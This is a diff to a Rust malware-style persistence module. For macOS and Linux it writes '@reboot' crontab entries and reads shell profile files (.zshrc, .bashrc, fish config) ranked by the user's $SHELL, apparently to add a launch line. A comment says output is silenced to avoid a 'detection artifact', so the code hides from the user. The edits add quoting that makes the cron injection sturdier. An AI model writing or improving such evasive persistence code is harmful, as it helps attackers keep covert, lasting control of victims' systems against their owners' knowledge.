@@ -596,12 +596,17 @@ pub mod macos {
     impl Persist for CronJob {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
-            let entry = format!("@reboot {} >/dev/null 2>&1 {}", exe, MAC_CRON_MARKER);
+            let escaped_exe = exe.replace("'", "'\\''");
+            let entry = format!(
+                "@reboot '{}' >/dev/null 2>&1 {}",
+                escaped_exe, MAC_CRON_MARKER
+            );
+            let escaped_entry = entry.replace("'", "'\\''");
             let out = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
                     "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
-                    MAC_CRON_MARKER, entry
+                    MAC_CRON_MARKER, escaped_entry
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::install: {}", e))?;
@@ -912,14 +917,16 @@ pub mod linux {
     impl Persist for CronJob {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
+            let escaped_exe = exe.replace("'", "'\\''");
             // Redirect both stdout and stderr to /dev/null so cron does not
             // attempt to mail the output to the user (which would be a detection artifact).
-            let entry = format!("@reboot {} >/dev/null 2>&1 {}", exe, CRON_MARKER);
+            let entry = format!("@reboot '{}' >/dev/null 2>&1 {}", escaped_exe, CRON_MARKER);
+            let escaped_entry = entry.replace("'", "'\\''");
             let out = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
                     "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
-                    CRON_MARKER, entry
+                    CRON_MARKER, escaped_entry
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::install: {}", e))?;
@@ -961,7 +968,28 @@ pub mod linux {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
             let home = dirs::home_dir().ok_or_else(|| anyhow!("ShellProfile: no home dir"))?;
-            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
+            let mut profile_names = vec![".zshrc", ".bashrc", ".profile", ".bash_profile"];
+            if let Ok(shell) = std::env::var("SHELL") {
+                let shell = shell.to_ascii_lowercase();
+                let preferred = if shell.contains("zsh") {
+                    Some(".zshrc")
+                } else if shell.contains("bash") {
+                    Some(".bashrc")
+                } else if shell.contains("fish") {
+                    Some(".config/fish/config.fish")
+                } else {
+                    None
+                };
+
+                if let Some(profile) = preferred {
+                    if let Some(idx) = profile_names.iter().position(|p| *p == profile) {
+                        profile_names.remove(idx);
+                    }
+                    profile_names.insert(0, profile);
+                }
+            }
+
+            for profile_name in &profile_names {
                 let path = home.join(profile_name);
                 if path.exists() {
                     let existing = std::fs::read_to_string(&path).unwrap_or_default();
